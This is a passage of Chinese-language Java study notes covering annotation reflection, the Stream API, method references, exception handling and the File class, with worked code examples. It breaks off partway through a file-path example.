指导思想:要解析谁上面的注解，就应该先拿到谁。

通过的反射先获取想听的字节码对象，然后使用一下方法对注解操作

| public Annotation[] getDeclaredAnnotations()                 | 获取当前对象上面的注解。       |
| ------------------------------------------------------------ | ------------------------------ |
| public T getDeclaredAnnotation(class<T> annotationclass)     | 获取指定的注解对象             |
| public boolean isAnnotationPresent(Class<Annotation> annotationClass) | 判断当前对象上是否存在某个注解 |

### 6、Stream流

Stream流的好处

- 直接阅读代码的字面意思即可完美展示无关逻辑方式的语义：获取流、过滤姓张、过滤长度为3、逐一打印
- Stream流把真正的函数式编程风格引入到Java中
- 代码简洁

#### 6.1 什么是流

![image-20231126112641220](./img/小米虫爬山路-img/image-20231126112641220-1700969207427-1.png)

##### 6.1.1 Stream流的三类方法

- 获取Stream流
  - 创建一条流水线,并把数据放到流水线上准备进行操作
- 中间方法
  - 流水线上的操作
  - 一次操作完毕之后,还可以继续进行其他操作
- 终结方法
  - 一个Stream流只能有一个终结方法
  - 是流水线上的最后一个操作

#### 6.2 生成Stream流的方式

- Collection体系集合

  使用默认方法stream()生成流， default Stream<E> stream()

- Map体系集合

  把Map转成Set集合，间接的生成流

- 数组

  通过Arrays中的静态方法stream生成流

- 同种数据类型的多个数据

  通过Stream接口的静态方法of(T... values)生成流

```java
public class StreamDemo {
    public static void main(String[] args) {
        //Collection体系的集合可以使用默认方法stream()生成流
        List<String> list = new ArrayList<String>();
        Stream<String> listStream = list.stream();

        Set<String> set = new HashSet<String>();
        Stream<String> setStream = set.stream();

        //Map体系的集合间接的生成流
        Map<String,Integer> map = new HashMap<String, Integer>();
        Stream<String> keyStream = map.keySet().stream();
        Stream<Integer> valueStream = map.values().stream();
        Stream<Map.Entry<String, Integer>> entryStream = map.entrySet().stream();

        //数组可以通过Arrays中的静态方法stream生成流
        String[] strArray = {"hello","world","java"};
        Stream<String> strArrayStream = Arrays.stream(strArray);
      
      	//同种数据类型的多个数据可以通过Stream接口的静态方法of(T... values)生成流
        Stream<String> strArrayStream2 = Stream.of("hello", "world", "java");
        Stream<Integer> intStream = Stream.of(10, 20, 30);
    }
}
```

#### 6.3 Stream流中间操作方法

- 概念

  中间操作的意思是,执行完此方法之后,Stream流依然可以继续执行其他操作

- 常见方法


| 方法名                                          | 说明                                                       |
| ----------------------------------------------- | ---------------------------------------------------------- |
| Stream<T> filter(Predicate predicate)           | 用于对流中的数据进行过滤                                   |
| Stream<T> limit(long maxSize)                   | 返回此流中的元素组成的流，截取前指定参数个数的数据         |
| Stream<T> skip(long n)                          | 跳过指定参数个数的数据，返回由该流的剩余元素组成的流       |
| static <T> Stream<T> concat(Stream a, Stream b) | 合并a和b两个流为一个流                                     |
| Stream<T> distinct()                            | 返回由该流的不同元素（根据Object.equals(Object) ）组成的流 |
| Stream<T> map()                                 | 转换流中的数据类型                                         |

==注意1:中间方法，返回新的Stream流，原来的Stream流只能使用一次，建议使用链式编程==

==注意2:修改Stream流中的数据，不会影响原来集合或者数组中的数据==

```java
//filter
public class MyStream3 {
    public static void main(String[] args) {
//        Stream<T> filter(Predicate predicate)：过滤
//        Predicate接口中的方法	boolean test(T t)：对给定的参数进行判断，返回一个布尔值

        ArrayList<String> list = new ArrayList<>();
        list.add("张三丰");
        list.add("张无忌");
        list.add("张翠山");
        list.add("王二麻子");
        list.add("张良");
        list.add("谢广坤");

        //filter方法获取流中的 每一个数据.
        //而test方法中的s,就依次表示流中的每一个数据.
        //我们只要在test方法中对s进行判断就可以了.
        //如果判断的结果为true,则当前的数据留下
        //如果判断的结果为false,则当前数据就不要.
//        list.stream().filter(
//                new Predicate<String>() {
//                    @Override
//                    public boolean test(String s) {
//                        boolean result = s.startsWith("张");
//                        return result;
//                    }
//                }
//        ).forEach(s-> System.out.println(s));

        //因为Predicate接口中只有一个抽象方法test
        //所以我们可以使用lambda表达式来简化
//        list.stream().filter(
//                (String s)->{
//                    boolean result = s.startsWith("张");
//                        return result;
//                }
//        ).forEach(s-> System.out.println(s));

        list.stream().filter(s ->s.startsWith("张")).forEach(s-> System.out.println(s));

    }
}
//limit&skip
public class StreamDemo02 {
    public static void main(String[] args) {
        //创建一个集合，存储多个字符串元素
        ArrayList<String> list = new ArrayList<String>();

        list.add("林青霞");
        list.add("张曼玉");
        list.add("王祖贤");
        list.add("柳岩");
        list.add("张敏");
        list.add("张无忌");

        //需求1：取前3个数据在控制台输出
        list.stream().limit(3).forEach(s-> System.out.println(s));
        System.out.println("--------");

        //需求2：跳过3个元素，把剩下的元素在控制台输出
        list.stream().skip(3).forEach(s-> System.out.println(s));
        System.out.println("--------");

        //需求3：跳过2个元素，把剩下的元素中前2个在控制台输出
        list.stream().skip(2).limit(2).forEach(s-> System.out.println(s));
    }
}
//concat&distinct
public class StreamDemo03 {
    public static void main(String[] args) {
        //创建一个集合，存储多个字符串元素
        ArrayList<String> list = new ArrayList<String>();

        list.add("林青霞");
        list.add("张曼玉");
        list.add("王祖贤");
        list.add("柳岩");
        list.add("张敏");
        list.add("张无忌");

        //需求1：取前4个数据组成一个流
        Stream<String> s1 = list.stream().limit(4);

        //需求2：跳过2个数据组成一个流
        Stream<String> s2 = list.stream().skip(2);

        //需求3：合并需求1和需求2得到的流，并把结果在控制台输出
//        Stream.concat(s1,s2).forEach(s-> System.out.println(s));

        //需求4：合并需求1和需求2得到的流，并把结果在控制台输出，要求字符串元素不能重复
        Stream.concat(s1,s2).distinct().forEach(s-> System.out.println(s));
    }
}
```

#### 6.4 Stream流终结操作方法

- 概念

  终结操作的意思是,执行完此方法之后,Stream流将不能再执行其他操作

- 常见方法


| 方法名                        | 说明                     |
| ----------------------------- | ------------------------ |
| void forEach(Consumer action) | 对此流的每个元素执行操作 |
| long count()                  | 返回此流中的元素数       |

```java
public class MyStream5 {
    public static void main(String[] args) {
        ArrayList<String> list = new ArrayList<>();
        list.add("张三丰");
        list.add("张无忌");
        list.add("张翠山");
        list.add("王二麻子");
        list.add("张良");
        list.add("谢广坤");

        //method1(list);
        
//        long count()：返回此流中的元素数
        long count = list.stream().count();
        System.out.println(count);
    }

    private static void method1(ArrayList<String> list) {
        //  void forEach(Consumer action)：对此流的每个元素执行操作
        //  Consumer接口中的方法void accept(T t)：对给定的参数执行此操作
        //在forEach方法的底层,会循环获取到流中的每一个数据.
        //并循环调用accept方法,并把每一个数据传递给accept方法
        //s就依次表示了流中的每一个数据.
        //所以,我们只要在accept方法中,写上处理的业务逻辑就可以了.
        list.stream().forEach(
                new Consumer<String>() {
                    @Override
                    public void accept(String s) {
                        System.out.println(s);
                    }
                }
        );
      
        System.out.println("====================");
        //lambda表达式的简化格式
        //是因为Consumer接口中,只有一个accept方法
        list.stream().forEach(
                (String s)->{
                    System.out.println(s);
                }
        );
        System.out.println("====================");
        //lambda表达式还是可以进一步简化的.
        list.stream().forEach(s->System.out.println(s));
    }
}
```

#### 6.5 Stream流的收集操作

- 概念

  对数据使用Stream流的方式操作完毕后,可以把流中的数据收集到集合中

- 常用方法

  | 方法名                         | 说明               |
  | ------------------------------ | ------------------ |
  | R collect(Collector collector) | 把结果收集到集合中 |

- 工具类Collectors提供了具体的收集方式

  | 方法名                                                       | 说明                   |
  | ------------------------------------------------------------ | ---------------------- |
  | public static <T> Collector toList()                         | 把元素收集到List集合中 |
  | public static <T> Collector toSet()                          | 把元素收集到Set集合中  |
  | public static  Collector toMap(Function keyMapper,Function valueMapper) | 把元素收集到Map集合中  |

- 代码演示

  ```java
  // toList和toSet方法演示 
  public class MyStream7 {
      public static void main(String[] args) {
          ArrayList<Integer> list1 = new ArrayList<>();
          for (int i = 1; i <= 10; i++) {
              list1.add(i);
          }
  
          list1.add(10);
          list1.add(10);
          list1.add(10);
          list1.add(10);
          list1.add(10);
  
          //filter负责过滤数据的.
          //collect负责收集数据.
                  //获取流中剩余的数据,但是他不负责创建容器,也不负责把数据添加到容器中.
          //Collectors.toList() : 在底层会创建一个List集合.并把所有的数据添加到List集合中.
          List<Integer> list = list1.stream().filter(number -> number % 2 == 0)
                  .collect(Collectors.toList());
  
          System.out.println(list);
  
      Set<Integer> set = list1.stream().filter(number -> number % 2 == 0)
              .collect(Collectors.toSet());
      System.out.println(set);
  }
  }
  /**
  Stream流的收集方法 toMap方法演示
  创建一个ArrayList集合，并添加以下字符串。字符串中前面是姓名，后面是年龄
  "zhangsan,23"
  "lisi,24"
  "wangwu,25"
  保留年龄大于等于24岁的人，并将结果收集到Map集合中，姓名为键，年龄为值
  */
  public class MyStream8 {
  	public static void main(String[] args) {
        	ArrayList<String> list = new ArrayList<>();
          list.add("zhangsan,23");
          list.add("lisi,24");
          list.add("wangwu,25");
  
          Map<String, Integer> map = list.stream().filter(
                  s -> {
                      String[] split = s.split(",");
                      int age = Integer.parseInt(split[1]);
                      return age >= 24;
                  }
  
           //   collect方法只能获取到流中剩余的每一个数据.
           //在底层不能创建容器,也不能把数据添加到容器当中
  
           //Collectors.toMap 创建一个map集合并将数据添加到集合当中
  
            // s 依次表示流中的每一个数据
  
            //第一个lambda表达式就是如何获取到Map中的键
            //第二个lambda表达式就是如何获取Map中的值
          ).collect(Collectors.toMap(
                  s -> s.split(",")[0],
                  s -> Integer.parseInt(s.split(",")[1]) ));
  
          System.out.println(map);
  	}
  }
  ```

### 7、方法引用

##### 7.1 方法引用符号

==**:: 符号为引用运算符，而它所在的表达式被称为方法引用**==



把已经存在的方法拿过来用，当做函数式接口中抽象方法的方法体



==推导与省略==

- 如果使用Lambda，那么根据“可推导就是可省略”的原则，无需指定参数类型，也无需指定的重载形式，它们都将被自动推导
- 如果使用方法引用，也是同样可以根据上下文进行推导
- 方法引用是Lambda的孪生兄弟



==**方法引用的出现原因:**==

- 在使用Lambda表达式的时候，我们实际上传递进去的代码就是一种解决方案：拿参数做操作

- 那么考虑一种情况：如果我们在Lambda中所指定的操作方案，已经有地方存在相同方案，那是否还有必要再写重复逻辑呢？答案肯定是没有必要

- 那我们又是如何使用已经存在的方案的呢？

- 这就是我们要讲解的方法引用，我们是通过方法引用来使用已经存在的方案

```java
public interface Printable {
    void printString(String s);
}

public class PrintableDemo {
    public static void main(String[] args) {
        //在主方法中调用usePrintable方法
//        usePrintable((String s) -> {
//            System.out.println(s);
//        });
	    //Lambda简化写法
        usePrintable(s -> System.out.println(s));

        //方法引用
        usePrintable(System.out::println);

    }

    private static void usePrintable(Printable p) {
        p.printString("爱生活爱Java");
    }
}
```



==**方法引用的规则**==

1. 需要有函数式接口
2. 被引用的方法必须已经存在
3. 被引用方法的形参，需要跟抽象方法的第二个形参到最后一个形参保持一致，返回值需要保持一致。
4. 被引用方法的功能需要满足当前的需求

==**抽象方法形参的详解**==

- 第一个参数:表示被引用方法的调用者，决定了可以引用哪些类中的方法在stream流当中，第一个参数一般都表示流里面的每一个数据。假设流里面的数据是字符串，那么使用这种方式进行方法引用，只能引用string这个类中的方法
- 第二个参数到最后一个参数:跟被引用方法的形参保持一致，==**如果没有第二个参数，说明被引用的方法需要是无参的成员方法或有参的非成员方法**==







##### 7.1 引用静态方法

引用类方法，其实就是引用类的静态方法

- 格式

  ==**类名::静态方法**==

- 范例

  Integer::parseInt

  Integer类的方法：public static int parseInt(String s) 将此String转换为int类型数据

- 练习描述

  - 定义一个接口(Converter)，里面定义一个抽象方法 int convert(String s);
  - 定义一个测试类(ConverterDemo)，在测试类中提供两个方法
    - 一个方法是：useConverter(Converter c)
    - 一个方法是主方法，在主方法中调用useConverter方法

- 代码演示

```java
public interface Converter {
    int convert(String s);
}

public class ConverterDemo {
    public static void main(String[] args) {

		//Lambda写法
        useConverter(s -> Integer.parseInt(s));

        //引用类方法
        useConverter(Integer::parseInt);

    }

    private static void useConverter(Converter c) {
        int number = c.convert("666");
        System.out.println(number);
    }
}
```

##### 7.2 引用成员方法

​	引用对象的实例方法，其实就引用类中的成员方法

- 格式

  ==**对象::成员方法**==

- 范例

  "HelloWorld"::toUpperCase

    String类中的方法：public String toUpperCase() 将此String所有字符转换为大写

- 练习描述

  - 定义一个类(PrintString)，里面定义一个方法

    public void printUpper(String s)：把字符串参数变成大写的数据，然后在控制台输出

  - 定义一个接口(Printer)，里面定义一个抽象方法

    void printUpperCase(String s)

  - 定义一个测试类(PrinterDemo)，在测试类中提供两个方法

    - 一个方法是：usePrinter(Printer p)
    - 一个方法是主方法，在主方法中调用usePrinter方法

- 代码演示

```java
public class PrintString {
    //把字符串参数变成大写的数据，然后在控制台输出
    public void printUpper(String s) {
        String result = s.toUpperCase();
        System.out.println(result);
    }
}

public interface Printer {
    void printUpperCase(String s);
}

public class PrinterDemo {
    public static void main(String[] args) {

		//Lambda简化写法
        usePrinter(s -> System.out.println(s.toUpperCase()));

        //引用对象的实例方法
        PrintString ps = new PrintString();
        usePrinter(ps::printUpper);

    }

    private static void usePrinter(Printer p) {
        p.printUpperCase("HelloWorld");
    }
}
```

##### 7.3 引用类的实例方法

引用类的实例方法，其实就是引用类中的成员方法

- 格式

  ==**类名::成员方法**==

- 范例

  String::substring

  public String substring(int beginIndex,int endIndex) 

  从beginIndex开始到endIndex结束，截取字符串。返回一个子串，子串的长度为endIndex-beginIndex

- 练习描述

  - 定义一个接口(MyString)，里面定义一个抽象方法：

    String mySubString(String s,int x,int y);

  - 定义一个测试类(MyStringDemo)，在测试类中提供两个方法

    - 一个方法是：useMyString(MyString my)
    - 一个方法是主方法，在主方法中调用useMyString方法

- 代码演示

```java
public interface MyString {
    String mySubString(String s,int x,int y);
}

public class MyStringDemo {
    public static void main(String[] args) {
		//Lambda简化写法
        useMyString((s,x,y) -> s.substring(x,y));

        //引用类的实例方法
        useMyString(String::substring);

    }

    private static void useMyString(MyString my) {
        String s = my.mySubString("HelloWorld", 2, 5);
        System.out.println(s);
    }
}
```

使用说明

- Lambda表达式被类的实例方法替代的时候
- 第一个参数作为调用者
- 后面的参数全部传递给该方法作为参数 

##### 7.4 引用构造方法

引用构造器，其实就是引用构造方法

- 格式

  类名::new

- 范例

  Student::new

- 练习描述

  - 定义一个类(Student)，里面有两个成员变量(name,age)

    并提供无参构造方法和带参构造方法，以及成员变量对应的get和set方法

  - 定义一个接口(StudentBuilder)，里面定义一个抽象方法

    Student build(String name,int age);

  - 定义一个测试类(StudentDemo)，在测试类中提供两个方法

    - 一个方法是：useStudentBuilder(StudentBuilder s)
    - 一个方法是主方法，在主方法中调用useStudentBuilder方法

- 代码演示

```java
public class Student {
    private String name;
    private int age;

    public Student() {
    }

    public Student(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}

public interface StudentBuilder {
    Student build(String name,int age);
}

public class StudentDemo {
    public static void main(String[] args) {

		//Lambda简化写法
        useStudentBuilder((name,age) -> new Student(name,age));

        //引用构造器
        useStudentBuilder(Student::new);

    }

    private static void useStudentBuilder(StudentBuilder sb) {
        Student s = sb.build("林青霞", 30);
        System.out.println(s.getName() + "," + s.getAge());
    }
}
```

### 8、异常

#### 8.1 异常概念

异常，就是不正常的意思。在生活中:医生说,你的身体某个部位有异常,该部位和正常相比有点不同,该部位的功能将受影响.在程序中的意思就是：

* **异常** ：指的是程序在执行过程中，出现的非正常的情况，最终会导致JVM的非正常停止。

在Java等面向对象的编程语言中，异常本身是一个类，产生异常就是创建异常对象并抛出了一个异常对象。Java处理异常的方式是中断处理。

> 异常指的并不是语法错误,语法错了,编译不通过,不会产生字节码文件,根本不能运行.

#### 8.2 异常体系

异常机制其实是帮助我们**找到**程序中的问题，异常的根类是`java.lang.Throwable`，其下有两个子类：`java.lang.Error`与`java.lang.Exception`，平常所说的异常指`java.lang.Exception`。

![image-20240115095542594](./img/小米虫爬山路-img/image-20240115095542594.png)

![image-20240115100045429](./img/小米虫爬山路-img/image-20240115100045429.png)



**Throwable体系：**

* **Error**:严重错误Error，无法通过处理的错误，只能事先避免，好比绝症。
* **Exception**:表示异常，异常产生后程序员可以通过代码的方式纠正，使程序继续运行，是必须要处理的。好比感冒、阑尾炎。

**Throwable中的常用方法：**

* `public void printStackTrace()`:打印异常的详细信息。

  *包含了异常的类型,异常的原因,还包括异常出现的位置,在开发和调试阶段,都得使用printStackTrace。*

* `public String getMessage()`:获取发生异常的原因。

  *提示给用户的时候,就提示错误原因。*

* `public String toString()`:获取异常的类型和异常描述信息(不用)。

***出现异常,不要紧张,把异常的简单类名,拷贝到API中去查。***

![img](./img/小米虫爬山路-img/简单的异常查看.bmp)

#### 8.3 异常分类

我们平常说的异常就是指Exception，因为这类异常一旦出现，我们就要对代码进行更正，修复程序。

**异常(Exception)的分类**:根据在编译时期还是运行时期去检查异常?

* **编译时期异常**:checked异常。在编译时期,就会检查,如果没有处理异常,则编译失败。(如日期格式化异常)（提醒程序员检测系统信息）
* **运行时期异常**:runtime异常。在运行时期,检查异常.在编译时期,运行异常不会编译器检测(不报错)。(如数学异常)

![image-20240115110021165](./img/小米虫爬山路-img/image-20240115110021165.png)

![image-20240115110154627](./img/小米虫爬山路-img/image-20240115110154627.png)

#### 8.4 异常的产生过程解析

先运行下面的程序，程序会产生一个数组索引越界异常ArrayIndexOfBoundsException。我们通过图解来解析下异常产生的过程。

 工具类

```java
public class ArrayTools {
    // 对给定的数组通过给定的角标获取元素。
    public static int getElement(int[] arr, int index) {
        int element = arr[index];
        return element;
    }
}
```

测试类

```java
public class ExceptionDemo {
    public static void main(String[] args) {
        int[] arr = { 34, 12, 67 };
        intnum = ArrayTools.getElement(arr, 4)
        System.out.println("num=" + num);
        System.out.println("over");
    }
}
```

上述程序执行过程图解：

![image-20240115110447939](./img/小米虫爬山路-img/image-20240115110447939.png)

#### 8.5 抛出异常throw

在编写程序时，我们必须要考虑程序出现问题的情况。比如，在定义方法时，方法需要接受参数。那么，当调用方法使用接受到的参数时，首先需要先对参数数据进行合法的判断，数据若不合法，就应该告诉调用者，传递合法的数据进来。这时需要使用抛出异常的方式来告诉调用者。

在java中，提供了一个**throw**关键字，它用来抛出一个指定的异常对象。那么，抛出一个异常具体如何操作呢？

1. 创建一个异常对象。封装一些提示信息(信息可以自己编写)。

2. 需要将这个异常对象告知给调用者。怎么告知呢？怎么将这个异常对象传递到调用者处呢？通过关键字throw就可以完成。throw 异常对象。

   throw**用在方法内**，用来抛出一个异常对象，将这个异常对象传递到调用者处，并结束当前方法的执行。

**使用格式：**

```java
throw new 异常类名(参数);
```

例如

```java
throw new NullPointerException("要访问的arr数组不存在");

throw new ArrayIndexOutOfBoundsException("该索引在数组中不存在，已超出范围");
```

学习完抛出异常的格式后，我们通过下面程序演示下throw的使用。

```java
public class ThrowDemo {
    public static void main(String[] args) {
        //创建一个数组 
        int[] arr = {2,4,52,2};
        //根据索引找对应的元素 
        int index = 4;
        int element = getElement(arr, index);

        System.out.println(element);
        System.out.println("over");
    }
    /*
     * 根据 索引找到数组中对应的元素
     */
    public static int getElement(int[] arr,int index){ 
       	//判断  索引是否越界
        if(index<0 || index>arr.length-1){
             /*
             判断条件如果满足，当执行完throw抛出异常对象后，方法已经无法继续运算。
             这时就会结束当前方法的执行，并将异常告知给调用者。这时就需要通过异常来解决。 
              */
             throw new ArrayIndexOutOfBoundsException("哥们，角标越界了```");
        }
        int element = arr[index];
        return element;
    }
}
```

注意：如果产生了问题，我们就会throw将问题描述类即异常进行抛出，也就是将问题返回给该方法的调用者。

那么对于调用者来说，该怎么处理呢？一种是进行捕获处理，另一种就是继续讲问题声明出去，使用throws声明处理。

8.6 声明异常throws

**声明异常**：将问题标识出来，报告给调用者。如果方法内通过throw抛出了编译时异常，而没有捕获处理（稍后讲解该方式），那么必须通过throws进行声明，让调用者去处理。

关键字**throws**运用于方法声明之上,用于表示当前方法不处理异常,而是提醒该方法的调用者来处理异常(抛出异常).

**声明异常格式：**

```java
修饰符 返回值类型 方法名(参数) throws 异常类名1,异常类名2…{   }	
```

声明异常的代码演示：

```java
public class ThrowsDemo {
    public static void main(String[] args) throws FileNotFoundException {
        read("a.txt");
    }

    // 如果定义功能时有问题发生需要报告给调用者。可以通过在方法上使用throws关键字进行声明
    public static void read(String path) throws FileNotFoundException {
        if (!path.equals("a.txt")) {//如果不是 a.txt这个文件 
            // 我假设  如果不是 a.txt 认为 该文件不存在 是一个错误 也就是异常  throw
            throw new FileNotFoundException("文件不存在");
        }
    }
}
```

throws用于进行异常类的声明，若该方法可能有多种异常情况产生，那么在throws后面可以写多个异常类，用逗号隔开。

```java
public class ThrowsDemo2 {
    public static void main(String[] args) throws IOException {
        read("a.txt");
    }

    public static void read(String path)throws FileNotFoundException, IOException {
        if (!path.equals("a.txt")) {//如果不是 a.txt这个文件 
            // 我假设  如果不是 a.txt 认为 该文件不存在 是一个错误 也就是异常  throw
            throw new FileNotFoundException("文件不存在");
        }
        if (!path.equals("b.txt")) {
            throw new IOException();
        }
    }
}
```



#### 8.6 声明异常

**声明异常**：将问题标识出来，报告给调用者。如果方法内通过throw抛出了编译时异常，而没有捕获处理（稍后讲解该方式），那么必须通过throws进行声明，让调用者去处理。

关键字**throws**运用于方法声明之上,用于表示当前方法不处理异常,而是提醒该方法的调用者来处理异常(抛出异常)。

**声明异常格式：**

```java
修饰符 返回值类型 方法名(参数) throws 异常类名1,异常类名2…{   }	
```

声明异常的代码演示：

```java
public class ThrowsDemo {
    public static void main(String[] args) throws FileNotFoundException {
        read("a.txt");
    }

    // 如果定义功能时有问题发生需要报告给调用者。可以通过在方法上使用throws关键字进行声明
    public static void read(String path) throws FileNotFoundException {
        if (!path.equals("a.txt")) {//如果不是 a.txt这个文件 
            // 我假设  如果不是 a.txt 认为 该文件不存在 是一个错误 也就是异常  throw
            throw new FileNotFoundException("文件不存在");
        }
    }
}
```

throws用于进行异常类的声明，若该方法可能有多种异常情况产生，那么在throws后面可以写多个异常类，用逗号隔开。

```java
public class ThrowsDemo2 {
    public static void main(String[] args) throws IOException {
        read("a.txt");
    }

    public static void read(String path)throws FileNotFoundException, IOException {
        if (!path.equals("a.txt")) {//如果不是 a.txt这个文件 
            // 我假设  如果不是 a.txt 认为 该文件不存在 是一个错误 也就是异常  throw
            throw new FileNotFoundException("文件不存在");
        }
        if (!path.equals("b.txt")) {
            throw new IOException();
        }
    }
}
```

==**注意:只有当异常被抛到了JVM虚拟机后程序才会停止。**==

#### 8.7 捕获异常try…catch

如果异常出现的话,会立刻终止程序,所以我们得处理异常:

1. 该方法不处理,而是声明抛出,由该方法的调用者来处理(throws)。
2. 在方法中使用try-catch的语句块来处理异常。

**try-catch**的方式就是捕获异常。

* **捕获异常**：Java中对异常有针对性的语句进行捕获，可以对出现的异常进行指定方式的处理。

捕获异常语法如下：

```java
try{
     编写可能会出现异常的代码
}catch(异常类型  e){
     处理异常的代码
     //记录日志/打印异常信息/继续抛出异常
}
```

**try：**该代码块中编写可能产生异常的代码。

**catch：**用来进行某种异常的捕获，实现对捕获到的异常进行处理。

> 注意:try和catch都不能单独使用,必须连用。

演示如下：

```java
public class TryCatchDemo {
    public static void main(String[] args) {
        try {// 当产生异常时，必须有处理方式。要么捕获，要么声明。
            read("b.txt");
        } catch (FileNotFoundException e) {// 括号中需要定义什么呢？
          	//try中抛出的是什么异常，在括号中就定义什么异常类型
            System.out.println(e);
        }
        System.out.println("over");
    }
    /*
     *
     * 我们 当前的这个方法中 有异常  有编译期异常
     */
    public static void read(String path) throws FileNotFoundException {
        if (!path.equals("a.txt")) {//如果不是 a.txt这个文件 
            // 我假设  如果不是 a.txt 认为 该文件不存在 是一个错误 也就是异常  throw
            throw new FileNotFoundException("文件不存在");
        }
    }
}
```

如何获取异常信息：

Throwable类中定义了一些查看方法:

* `public String getMessage()`:获取异常的描述信息,原因(提示给用户的时候,就提示错误原因。


* `public String toString()`:获取异常的类型和异常描述信息(不用)。
* `public void printStackTrace()`:打印异常的跟踪栈信息并输出到控制台。

​            *包含了异常的类型,异常的原因,还包括异常出现的位置,在开发和调试阶段,都得使用printStackTrace。*

在开发中呢也可以在catch将编译期异常转换成运行期异常处理。

多个异常使用捕获又该如何处理呢？

1. 多个异常分别处理。
2. 多个异常一次捕获，多次处理。
3. 多个异常一次捕获一次处理。

一般我们是使用一次捕获多次处理方式，格式如下：

```java
try{
     编写可能会出现异常的代码
}catch(异常类型A  e){  当try中出现A类型异常,就用该catch来捕获.
     处理异常的代码
     //记录日志/打印异常信息/继续抛出异常
}catch(异常类型B  e){  当try中出现B类型异常,就用该catch来捕获.
     处理异常的代码
     //记录日志/打印异常信息/继续抛出异常
}
```

注意:这种异常处理方式，要求多个catch中的异常不能相同，并且若catch中的多个异常之间有子父类异常的关系，那么子类异常要求在上面的catch处理，父类异常在下面的catch处理。

#### 8.8 finally 代码块

**finally**：有一些特定的代码无论异常是否发生，都需要执行。另外，因为异常会引发程序跳转，导致有些语句执行不到。而finally就是解决这个问题的，在finally代码块中存放的代码都是一定会被执行的。

什么时候的代码必须最终执行？

当我们在try语句块中打开了一些物理资源(磁盘文件/网络连接/数据库连接等),我们都得在使用完之后,最终关闭打开的资源。

finally的语法:

 try...catch....finally:自身需要处理异常,最终还得关闭资源。

> 注意:finally不能单独使用。

比如在我们之后学习的IO流中，当打开了一个关联文件的资源，最后程序不管结果如何，都需要把这个资源关闭掉。

finally代码参考如下：

```java
public class TryCatchDemo4 {
    public static void main(String[] args) {
        try {
            read("a.txt");
        } catch (FileNotFoundException e) {
            //抓取到的是编译期异常  抛出去的是运行期 
            throw new RuntimeException(e);
        } finally {
            System.out.println("不管程序怎样，这里都将会被执行。");
        }
        System.out.println("over");
    }
    /*
     *
     * 我们 当前的这个方法中 有异常  有编译期异常
     */
    public static void read(String path) throws FileNotFoundException {
        if (!path.equals("a.txt")) {//如果不是 a.txt这个文件 
            // 我假设  如果不是 a.txt 认为 该文件不存在 是一个错误 也就是异常  throw
            throw new FileNotFoundException("文件不存在");
        }
    }
}
```

当只有在try或者catch中调用退出JVM的相关方法,此时finally才不会执行,否则finally永远会执行。

#### 8.9 异常注意事项

* 运行时异常被抛出可以不处理。即不捕获也不声明抛出。
* 如果父类抛出了多个异常,子类覆盖父类方法时,只能抛出相同的异常或者是他的子集。
* 父类方法没有抛出异常，子类覆盖父类该方法时也不可抛出异常。此时子类产生该异常，只能捕获处理，不能声明抛出
* 当多异常处理时，捕获处理，前边的类不能是后边类的父类
* 在try/catch后可以追加finally代码块，其中的代码一定会被执行，通常用于资源回收。

#### 8.10 概述

**为什么需要自定义异常类:**

我们说了Java中不同的异常类,分别表示着某一种具体的异常情况,那么在开发中总是有些异常情况是SUN没有定义好的,此时我们根据自己业务的异常情况来定义异常类。,例如年龄负数问题,考试成绩负数问题。

在上述代码中，发现这些异常都是JDK内部定义好的，但是实际开发中也会出现很多异常,这些异常很可能在JDK中没有定义过,例如年龄负数问题,考试成绩负数问题.那么能不能自己定义异常呢？

**什么是自定义异常类:**

在开发中根据自己业务的异常情况来定义异常类.

自定义一个业务逻辑异常: **LoginException**。一个登陆异常类。

**异常类如何定义:**

1. 自定义一个编译期异常: 自定义类 并继承于`java.lang.Exception`。
2. 自定义一个运行时期的异常类:自定义类 并继承于`java.lang.RuntimeException`。

### 9、File类

`java.io.File` 类是文件和目录路径名的抽象表示，主要用于文件和目录的创建、查找和删除等操作。

#### 9.1 构造方法

- `public File(String pathname) ` ：通过将给定的**路径名字符串**转换为抽象路径名来创建新的 File实例。  
- `public File(String parent, String child) ` ：从**父路径名字符串和子路径名字符串**创建新的 File实例。
- `public File(File parent, String child)` ：从**父抽象路径名和子路径名字符串**创建新的 File实例。  
- 构造举例，代码如下：

```java
// 文件路径名
String pathname = "D:\\aaa.txt";
File file1 = new File(pathname); 

// 文件路径名
String pathname2 = "D:\\aaa\\bbb.txt";
File file2 = new File(pathname2); 

// 通过父路径和子路径字符串
 String parent = "d:\\aaa";
 String child = "bbb.txt";
 File file3 = new File(parent, child);

// 通过父级File对象和子路径字符串
File parentDir = new File("d:\\aaa");
String child = "bbb.txt";
File file4 = new File(parentDir, child);
```

> 小贴士：
>
> 1. 一个File对象代表硬盘中实际存在的一个文件或者目录。
> 2. 无论该路径下是否存在文件或者目录，都不影响File对象的创建。

#### 9.2 常用方法

##### 9.2.1 获取功能的方法

- `public String getAbsolutePath() ` ：返回此File的绝对路径名字符串。

- ` public String getPath() ` ：将此File转换为路径名字符串。 

- `public String getName()`  ：返回由此File表示的文件或目录的名称。  

- `public long length()`  ：返回由此File表示的文件的长度。 

  方法演示，代码如下：

  ```java
  public class FileGet {
      public static void main(String[] args) {
          File f = new File("d:/aaa/bbb.java");     
          System.out.println("文件绝对路径:"+f.getAbsolutePath());
          System.out.println("文件构造路径:"+f.getPath());
          System.out.println("文件名称:"+f.getName());
          System.out.println("文件长度:"+f.length()+"字节");
  
          File f2 = new File("d:/aaa");     
          System.out.println("目录绝对路径:"+f2.getAbsolutePath());
          System.out.println("目录构造路径:"+f2.getPath());
          System.out.println("目录名称:"+f2.getName());
          System.out.println("目录长度:"+f2.length());
      }
  }
  输出结果：
  文件绝对路径:d:\aaa\bbb.java
  文件构造路径:d:\aaa\bbb.java
  文件名称:bbb.java
  文件长度:636字节
  
  目录绝对路径:d:\aaa
  目录构造路径:d:\aaa
  目录名称:aaa
  目录长度:4096
  ```

> API中说明：length()，表示文件的长度。但是File对象表示目录，则返回值未指定。

##### 9.2.2 绝对路径和相对路径

- **绝对路径**：从盘符开始的路径，这是一个完整的路径。
- **相对路径**：相对于项目目录的路径，这是一个便捷的路径，开发中经常使用。

```java
public class FilePath {
    public static void main(String[] args) {
      	// D盘下的bbb.java文件
        File f = new File("D:\\bbb.java");
        System.out.println(f.getAbsolutePath());
      	
		// 项目下的bbb.java文件
        File f2 = new File("bbb.java");
        System.out.println(f2.getAbsolutePath());
